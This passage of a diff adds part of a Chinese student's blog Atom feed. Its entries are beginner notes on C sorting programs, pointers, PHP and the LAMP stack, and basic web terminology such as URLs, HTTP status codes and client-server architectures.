+    <summary type="html">&lt;h1 id=&quot;MYSQL&quot;&gt;&lt;a href=&quot;#MYSQL&quot; class=&quot;headerlink&quot; title=&quot;MYSQL&quot;&gt;&lt;/a&gt;MYSQL&lt;/h1&gt;&lt;h4 id=&quot;基本操作&quot;&gt;&lt;a href=&quot;#基本操作&quot; class=&quot;headerlink&quot; title=&quot;基本操作&quot;</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/10/30/%E8%BF%90%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%B9%B6%E5%AF%B9%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F/"/>
+    <id>http://wifi-0x.github.io/2021/10/30/%E8%BF%90%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%B9%B6%E5%AF%B9%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%BF%9B%E8%A1%8C%E6%8E%92%E5%BA%8F/</id>
+    <published>2021-10-30T01:52:49.131Z</published>
+    <updated>2021-10-30T02:48:16.168Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="运用随机数并对随机数进行排序"><a href="#运用随机数并对随机数进行排序" class="headerlink" title="运用随机数并对随机数进行排序"></a>运用随机数并对随机数进行排序</h1><h2 id="（冒泡排序过程）"><a href="#（冒泡排序过程）" class="headerlink" title="（冒泡排序过程）"></a>（冒泡排序过程）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, t;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">srand((<span class="keyword">int</span>)time(<span class="number">0</span>));<span class="comment">//随机数发生器的初始化函数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The score of the singers:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">a[i] = (<span class="keyword">int</span>)(<span class="number">60</span> + <span class="number">40</span> * rand() / RAND_MAX);</span><br><span class="line"><span class="comment">//60&lt;=X&lt;=100</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);<span class="comment">//%5d是数据宽度的意思</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)<span class="comment">//进行9次循环，实现9趟比较</span></span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">9</span>-i;j++)<span class="comment">//在每一趟中进行9-i次比较</span></span><br><span class="line"><span class="keyword">if</span>(a[j]&gt;a[j+<span class="number">1</span>])</span><br><span class="line">&#123;<span class="comment">//两个数前后交换位子的方法</span></span><br><span class="line">t = a[j];</span><br><span class="line">a[j] = a[j + <span class="number">1</span>];</span><br><span class="line">a[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The sorted scores:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="（选择排序过程）"><a href="#（选择排序过程）" class="headerlink" title="（选择排序过程）"></a>（选择排序过程）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, t, k;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];<span class="comment">//以下产生10个60~100的随机数存于数组a并显示</span></span><br><span class="line">srand((<span class="keyword">int</span>)time(<span class="number">0</span>));<span class="comment">//随机数发生器的初始化函数</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The score of the singers:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">a[i] = (<span class="keyword">int</span>)(<span class="number">60</span> + <span class="number">40</span> * rand() / RAND_MAX);</span><br><span class="line"><span class="comment">//60&lt;=X&lt;=100</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);<span class="comment">//%5d是数据宽度的意思</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;<span class="comment">//进行9次循环，实现9趟 选择</span></span><br><span class="line">k = i;<span class="comment">//预置i为当前范围内最大值的下标，存放于k中</span></span><br><span class="line"><span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; <span class="number">10</span>; j++)<span class="comment">//在每一趟中进行9-i次比较</span></span><br><span class="line"><span class="keyword">if</span> (a[j] &gt; a[k]) k = j;<span class="comment">//两个数前后交换位子的方法</span></span><br><span class="line"><span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">t = a[i];</span><br><span class="line">a[i] = a[k];</span><br><span class="line">a[k] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The sorted scores:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, a[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;运用随机数并对随机数进行排序&quot;&gt;&lt;a href=&quot;#运用随机数并对随机数进行排序&quot; class=&quot;headerlink&quot; title=&quot;运用随机数并对随机数进行排序&quot;&gt;&lt;/a&gt;运用随机数并对随机数进行排序&lt;/h1&gt;&lt;h2 id=&quot;（冒泡排序过程）&quot;&gt;&lt;a href</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/10/27/%E6%94%B6%E8%97%8F/"/>
+    <id>http://wifi-0x.github.io/2021/10/27/%E6%94%B6%E8%97%8F/</id>
+    <published>2021-10-27T14:52:07.911Z</published>
+    <updated>2021-10-28T07:36:12.859Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="收藏"><a href="#收藏" class="headerlink" title="收藏"></a>收藏</h1><h6 id="调试了好久才成功的代码"><a href="#调试了好久才成功的代码" class="headerlink" title="调试了好久才成功的代码"></a>调试了好久才成功的代码</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">float</span> x = <span class="number">0</span>, a = <span class="number">1.0</span>, b = <span class="number">1.0</span>, sum = <span class="number">1</span>,d=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入x与n\n&quot;</span>);</span><br><span class="line">scanf_s(<span class="string">&quot;%f&quot;</span>, &amp;x);</span><br><span class="line">scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span> (i &lt;= n)</span><br><span class="line">&#123;</span><br><span class="line">a = a * x;</span><br><span class="line">b = b * i;</span><br><span class="line">d = a / b;</span><br><span class="line">sum += d;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;e*x=%f&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span>  zhimu=<span class="number">0</span>,kongge=<span class="number">0</span>,shuzhi=<span class="number">0</span>,other=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>  ch;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please enter a string of characters.&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span> || ch &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">zhimu++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">shuzhi++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">kongge++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">other++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;字母数为%d\n数字数为%d\n空格数为%d\n其他字符个数为%d\n&quot;</span>,zhimu,shuzhi,kongge,other);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/27/QsZG5cx6UCBEq2p.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;收藏&quot;&gt;&lt;a href=&quot;#收藏&quot; class=&quot;headerlink&quot; title=&quot;收藏&quot;&gt;&lt;/a&gt;收藏&lt;/h1&gt;&lt;h6 id=&quot;调试了好久才成功的代码&quot;&gt;&lt;a href=&quot;#调试了好久才成功的代码&quot; class=&quot;headerlink&quot; title=&quot;调试了</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/10/27/PHP(1)/"/>
+    <id>http://wifi-0x.github.io/2021/10/27/PHP(1)/</id>
+    <published>2021-10-27T14:44:15.613Z</published>
+    <updated>2021-10-27T14:44:15.792Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP(1)"></a>PHP(1)</h1><h3 id="对PHP的理解"><a href="#对PHP的理解" class="headerlink" title="对PHP的理解:"></a>对PHP的理解:</h3><p>全称为Hypertext Preprocessor，即超文本预处理器</p><p>PHP最初是个人主页（Personal Home Page）的缩写</p><p>是一种在服务器端运行的开源的脚本语言</p><p><img src="https://i.loli.net/2021/10/24/fFiravWgTluE7Xe.png"></p><h4 id="黄金组合"><a href="#黄金组合" class="headerlink" title="黄金组合"></a>黄金组合</h4><p><strong>LAMP</strong>组合（<u><strong>Linux,Apache,MySQL,PHP</strong></u>),这四个产品都是公开源代码的产品，无版权之争。 </p><p><em>php</em>是一门语言，用来做业务逻辑</p><p><em>Apache</em>为<em>php</em>提供了运行环境</p><p><em>mysql</em>数据库用来存储数据</p><h6 id="wapm组合：window-apche-mysql-php"><a href="#wapm组合：window-apche-mysql-php" class="headerlink" title="wapm组合：window+apche+mysql+php"></a>wapm组合：window+apche+mysql+php</h6>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;PHP-1&quot;&gt;&lt;a href=&quot;#PHP-1&quot; class=&quot;headerlink&quot; title=&quot;PHP(1)&quot;&gt;&lt;/a&gt;PHP(1)&lt;/h1&gt;&lt;h3 id=&quot;对PHP的理解&quot;&gt;&lt;a href=&quot;#对PHP的理解&quot; class=&quot;headerlink&quot; titl</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/10/24/%E4%B8%93%E4%B8%9A%E5%90%8D%E7%A7%B0&amp;%E6%A6%82%E5%BF%B5/"/>
+    <id>http://wifi-0x.github.io/2021/10/24/%E4%B8%93%E4%B8%9A%E5%90%8D%E7%A7%B0&amp;%E6%A6%82%E5%BF%B5/</id>
+    <published>2021-10-24T15:54:07.579Z</published>
+    <updated>2021-10-25T09:22:06.665Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="专业名词-amp-概念"><a href="#专业名词-amp-概念" class="headerlink" title="专业名词&amp;概念"></a>专业名词&amp;概念</h1><p>[TOC]</p><h3 id="URL（网址）路径"><a href="#URL（网址）路径" class="headerlink" title="URL（网址）路径"></a>URL（网址）路径</h3><p>如：内卷的代价(<a href="https://www.bilibili.com/video/BV1qf4y1g7yG?spm_id_from=333.851.b_7265636f6d6d656e64.4">https://www.bilibili.com/video/BV1qf4y1g7yG?spm_id_from=333.851.b_7265636f6d6d656e64.4</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">统一资源定位符 (uniform resource locator, url) 是用于完整地描述internet上网页和其他资源的地址的一种标识方法。 internet上的每一个网页都具有一个唯一的名称标识，通常称之为url地址，这种地址可以是本地磁盘，也可以是局域网上的某一台计算机，更多的是internet上的站点。简单地说，url就是web地址，俗称“网址”。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（协议）：//（主机名）/（端口号）/（文件名）/（文件路径） </span><br><span class="line">有两种超文本传送协议格式 </span><br><span class="line">mms </span><br><span class="line">http </span><br><span class="line">而后面的拓展名 是根据文件的类型来定义的 </span><br><span class="line">详细格式为： </span><br><span class="line">&#123;协议&#125;：//&#123;用户名&#125;:&#123;密码&#125;@&#123;主机名&#125;:&#123;端口号&#125;/&#123;路径&#125;/&#123;文件&#125;?&#123;参数&#125;</span><br></pre></td></tr></table></figure><h3 id="静态页面："><a href="#静态页面：" class="headerlink" title="静态页面："></a>静态页面：</h3><p><em><strong>简单来说</strong></em><em>就是</em>**服务器不执行的页面</p><p><strong>仔细地说就是</strong>无需经过服务器的编译，直接加载到客户浏览器上显示出来；占服务器空间，不能自主更新页面，每个网页都是一个独立的文件。静态页面一般是.html .shtml .htm 结尾，URL路径没有特殊符号如？% 等，无需加载后台程序 无需获取后台数据库，<u>用户只能在网页中浏览不能做任何的数据交换</u></p><p><strong>优点：</strong></p><p>1、访问速度快</p><p>2、内容相对稳定，比较容易被搜索引擎检索</p><p><strong>缺点：</strong></p><p>1、无数据库的支持，在网站制作和维护方面工作量较大；</p><p>2、交互性较差，在功能方面有较大的限制；</p><h3 id="动态页面："><a href="#动态页面：" class="headerlink" title="动态页面："></a>动态页面：</h3><p><strong>简单来说</strong>服务器执行的页面</p><p><strong>不简单地说</strong>动态页面一般指动态获取数据库查询，URL路径中包含特殊符号如 ？%等，例如淘宝网宝贝的筛选等。</p><p><img src="https://i.loli.net/2021/10/25/K5z9M2gpfBXTNws.jpg"></p><p>采用数据库的开发模式</p><p><strong>优点：</strong></p><p>1、可以实现更多的功能，如登录、注册、用户管理、订单管理等；</p><p><strong>缺点：</strong></p><p>1、在访问速度上不占优势</p><p>先获得用户指令，然后网页拿着指令到数据库找和指令对应的数据，然后传递给服务器，通过服务器的编译生成html代码，最后传递给用户浏览器。</p><p>这一过程需要几秒的时间，访问人数一多，加载速度就会变慢，对于服务器来说是一种负担；</p><p>2、在搜索引擎收录方面不占优势</p><p>动态页面是经过用户输入指令后才形成的页面，实际上并不存在这个页面；而搜索引擎只会抓取现成的。</p><h3 id="html"><a href="#html" class="headerlink" title="html"></a><strong>html</strong></h3><p>html文件就是正常见到的网页格式的文件，一般这种文件到了电脑上之后，就会变成默认浏览器的图标，就是说这个文件会使用这个浏览器打开。</p><p>　　HTML称为超文本标记语言，是一种标识性的语言。它包括一系列标签，通过这些标签可以<strong>将网络上的文档格式统一</strong>，使分散的Internet资源连接为一个逻辑整体。HTML文本是由HTML命令组成的描述性文本，HTML命令可以说明文字，图形、动画、声音、表格、链接等。</p><h3 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h3><p>　　超文本*<u>是一种组织信息的方式</u>*，它<strong>通过超级链接方法将文本中的文字、图表与其他信息媒体相关联</strong>。这些相互关联的信息媒体可能在同一文本中，也可能是其他文件，或是地理位置相距遥远的某台计算机上的文件。这种组织信息方式将分布在不同位置的信息资源用随机方式进行连接，为人们查找，检索信息提供方便。</p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><img src="https://i.loli.net/2021/10/25/gU8E4OS9QzCyqeB.png"></p><ul><li><table><thead><tr><th align="center">返回的状态码：</th></tr></thead><tbody><tr><td align="center">200表示成功</td></tr><tr><td align="center">403访问被决绝</td></tr><tr><td align="center">404页面没有找到</td></tr></tbody></table></li></ul><p><img src="https://i.loli.net/2021/10/25/U6ZuQnfAi439G1O.png"></p><p><img src="https://i.loli.net/2021/10/25/tJaNsUYvG5fwZbx.png"></p><h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>就是一个名字</p><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p><strong>CMS简单的说就是制作和管理网页用的一个工具软件</strong> 现在CMS建站系统非常的多 帝国、科讯等。<strong>就是内容管理系统..说的简单点..其实就是一个网站的整体模板。</strong>每种CMS的界面和操作规则都不太一样 基本都属于二次开发 让一些有基础但又称不上高手的人 用CMS建站系统建立并管理网站（代码多少得懂点）<br>注：基本上用CMS建立的网站都是在软件给出的效果中选择 不能随心所欲的设计（随心所欲的设计得是那些高手才行的 用CMS可以满足正常的建站要求）</p><h3 id="客户端和服务器端"><a href="#客户端和服务器端" class="headerlink" title="客户端和服务器端"></a>客户端和服务器端</h3><p>客户端：浏览者</p><p>服务器端：给浏览者提供</p><p><img src="https://i.loli.net/2021/10/25/F5RWLd3Y8ZKrbpo.jpg"></p><p><strong>红色方块</strong>为端口，里面的数字是端口号</p><h3 id="BS架构和CS架构"><a href="#BS架构和CS架构" class="headerlink" title="BS架构和CS架构"></a>BS架构和CS架构</h3><p>网络系统软件开发包括B/S与C/S两种结构都可以进行同样的业务处理</p><h4 id="BS-通过浏览器去访问服务器"><a href="#BS-通过浏览器去访问服务器" class="headerlink" title="**BS:**通过浏览器去访问服务器"></a>**BS:**通过浏览器去访问服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b:browser(浏览器)</span><br><span class="line">s：sever（服务器）</span><br></pre></td></tr></table></figure><p>所以的web都是BS架构的</p><p>特点：</p><p>1 不需要下载特定的客户端（方便）</p><p>2 和服务器进行HTTP协议</p><p>3 它将所以的数据储存在服务器上</p><p>优缺点：</p><p>1.B/S结构维护升级更方便</p><p>2.成本低，不用开发特定的客户端</p><p>3.数据相对安全，因为已经储存在服务器上</p><p>1，应用服务器运行数据复合较重</p><h4 id="CS：特定的客户端（client-去连接服务器-server"><a href="#CS：特定的客户端（client-去连接服务器-server" class="headerlink" title="CS：特定的客户端（client)去连接服务器(server)"></a><strong>CS</strong>：特定的客户端（client)去连接服务器(server)</h4><p>如：王者荣耀     QQ</p><p>特点：</p><p>1 C/S软件通常需要特定的客户端来使用。</p><p>2 可以通过任意协议进行通信。</p><p>3 它的客户端有数据处理和存储的能力，可以把应用程序的计算和数据分配在客户端和服务器端。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;专业名词-amp-概念&quot;&gt;&lt;a href=&quot;#专业名词-amp-概念&quot; class=&quot;headerlink&quot; title=&quot;专业名词&amp;amp;概念&quot;&gt;&lt;/a&gt;专业名词&amp;amp;概念&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
+&lt;h3 id=&quot;URL（网址）路径&quot;&gt;&lt;a hr</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/10/24/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B/"/>
+    <id>http://wifi-0x.github.io/2021/10/24/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B/</id>
+    <published>2021-10-24T03:02:57.893Z</published>
+    <updated>2021-10-24T03:02:58.186Z</updated>
+    
+    <content type="html"><![CDATA[<p>测试一下</p><p><img src="https://i.loli.net/2021/10/24/sdUu2WRB7rQahID.jpg"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;测试一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/10/24/sdUu2WRB7rQahID.jpg&quot;&gt;&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/10/24/%E6%8C%87%E9%92%88%EF%BC%881%EF%BC%89/"/>
+    <id>http://wifi-0x.github.io/2021/10/24/%E6%8C%87%E9%92%88%EF%BC%881%EF%BC%89/</id>
+    <published>2021-10-24T02:58:37.589Z</published>
+    <updated>2021-10-24T10:52:52.266Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="关于指针（1）"><a href="#关于指针（1）" class="headerlink" title="关于指针（1）"></a>关于指针（1）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>计算机中所有的数据都必须放在内存中，不同类型的数据占用的字节数不一样，例如 int 占用 4 个字节，char 占用 1 个字节。为了正确地访问这些数据，必须为每个字节都编上号码，就像门牌号、身份证号一样，每个字节的编号是唯一的，根据编号可以准确地找到某个字节。简单来说就是一个字节的地址</p><p>假设变量 a、b、c 在内存中的地址分别是 0X1000、0X2000、0X3000，那么加法运算<code>c = a + b;</code>将会被转换成类似下面的形式：</p><p>0X3000 = (0X1000) + (0X2000);</p><p>虽然<strong>变量名、函数名、字符串名和数组名</strong>在本质上是一样的，它们都是<em>地址的助记符</em>，但在编写代码的过程中，我们认为<strong>变量名表示的是数据本身</strong>，而<strong>函数名、字符串名和数组名表示的是代码块或数据块的首地址。</strong></p><h3 id="接下来是指针在编程过程中的应用"><a href="#接下来是指针在编程过程中的应用" class="headerlink" title="接下来是指针在编程过程中的应用"></a>接下来是指针在编程过程中的应用</h3><p><img src="https://i.loli.net/2021/10/24/AreiqmBQZNnblzt.png"></p><p>在这里我们可以看到指针的具体用法（这里我实在难以用言语来表达）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1=&amp;i <span class="comment">//通过取地址符&amp;，把i的地址赋给了p1 把这个称为p1指向i，</span></span><br><span class="line">    <span class="comment">//这样我们可以用*p1来表示i</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/24/TGC9ilJFafw6dhc.png"></p><h5 id="假如我设"><a href="#假如我设" class="headerlink" title="假如我设"></a>假如我设</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a,*p1=&amp;a <span class="comment">//下面这些都是等价的</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/24/SvTuzaoJLH4tkA9.png"></p><h5 id="在这里我们可以看到两种定义指针的方法1先定义变量，再把变量赋值给指针。2-把定义变量和赋值写在同一行。"><a href="#在这里我们可以看到两种定义指针的方法1先定义变量，再把变量赋值给指针。2-把定义变量和赋值写在同一行。" class="headerlink" title="在这里我们可以看到两种定义指针的方法1先定义变量，再把变量赋值给指针。2 把定义变量和赋值写在同一行。"></a>在这里我们可以看到两种定义指针的方法1先定义变量，再把变量赋值给指针。2 把定义变量和赋值写在同一行。</h5><p><img src="https://i.loli.net/2021/10/24/rd1kcaqOYmenHB8.png"></p><p><img src="https://i.loli.net/2021/10/24/sibp7dIn6efl4A9.png"></p><p><img src="https://i.loli.net/2021/10/24/LtYZINUzgE38pPy.png"></p><p><em>以上是指针的基本引用</em></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;关于指针（1）&quot;&gt;&lt;a href=&quot;#关于指针（1）&quot; class=&quot;headerlink&quot; title=&quot;关于指针（1）&quot;&gt;&lt;/a&gt;关于指针（1）&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://wifi-0x.github.io/2021/10/10/001/"/>
+    <id>http://wifi-0x.github.io/2021/10/10/001/</id>
+    <published>2021-10-10T14:56:31.188Z</published>
+    <updated>2021-10-10T14:57:40.096Z</updated>
+    
+    <content type="html"><![CDATA[<p>太感动了 终于发送成功了 0.0</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;太感动了 终于发送成功了 0.0&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="http://wifi-0x.github.io/2021/09/19/hello-world/"/>
+    <id>http://wifi-0x.github.io/2021/09/19/hello-world/</id>
+    <published>2021-09-19T07:05:38.796Z</published>
+    <updated>2021-09-19T07:05:38.796Z</updated>
+    
